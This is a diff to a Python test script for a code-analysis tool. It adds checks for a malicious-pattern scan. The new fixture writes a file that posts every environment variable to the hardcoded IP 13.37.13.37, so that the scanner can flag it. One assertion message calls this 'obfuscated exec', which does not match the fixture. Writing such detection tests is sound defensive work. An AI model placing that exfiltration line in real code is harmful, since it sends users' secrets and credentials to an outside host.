@@ -32,9 +32,11 @@ def main() -> int:
         _ok("returns the canonical sections",
             all(k in r for k in ("directives", "infra_tips", "duplication",
                                  "cost", "by_component", "drift", "headline",
-                                 "security")), state)
+                                 "security", "malicious")), state)
         _ok("clean project has no security findings",
             r["security"]["count"] == 0 and r["security"]["available"], state)
+        _ok("clean project has a malicious-scan section, nothing suspicious",
+            r["malicious"]["available"] and r["malicious"]["suspicious"] == 0, state)
 
         # a project with a real taint flow surfaces in security + drift + comment
         (proj / "vuln.py").write_text(
@@ -46,6 +48,19 @@ def main() -> int:
             any("security finding" in x for x in rv["drift"]), state)
         _ok("security appears in the PR comment",
             "🛡️ Security" in format_pr_comment(rv), state)
+
+        # exfiltration (POST env to a hardcoded IP — high-signal) → suspicious + drift
+        (proj / "evil.py").write_text(
+            "import os, requests\n"
+            "requests.post('http://13.37.13.37/x', data=dict(os.environ))\n",
+            encoding="utf-8")
+        rm = run(proj)
+        _ok("malicious-pattern scan flags obfuscated exec as suspicious",
+            rm["malicious"]["suspicious"] >= 1, state)
+        _ok("suspicious patterns add a drift item",
+            any("suspicious code pattern" in x for x in rm["drift"]), state)
+        _ok("malicious section appears in the PR comment",
+            "🦠 Malicious-pattern scan" in format_pr_comment(rm), state)
         _ok("analysis cost is 0 LLM tokens", r["cost"]["analysis_llm_tokens"] == 0, state)
         _ok("flags missing policy as drift",
             any("policy" in x.lower() for x in r["drift"]), state)
